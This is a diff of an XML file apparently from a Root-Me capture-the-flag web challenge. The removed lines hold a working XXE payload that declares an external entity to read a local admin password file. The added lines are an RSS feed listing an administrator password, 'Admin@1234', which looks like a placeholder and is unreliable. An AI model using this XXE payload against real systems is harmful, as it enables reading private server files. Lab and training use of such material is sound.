@@ -1,8 +1,13 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
-	<!ELEMENT root ANY>
-	<!ENTITY xxe SYSTEM "file:///challenge/web-serveur/ch29/admin_password.txt">
-]>
-<root>
-	&xxe;
-</root>
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+	<channel>
+		<title>Admin Password</title>
+		<link>http://challenge01.root-me.org/web-serveur/ch29 </link>
+		<description>Доступ к защищенной зоне администратора</description>
+		<item>
+			<title>Administrator Credentials</title>
+			<link> http://challenge01.root-me.org/web-serveur/ch29 </link>
+			<description>Password: Admin@1234</description>
+		</item>
+	</channel>
+</rss>
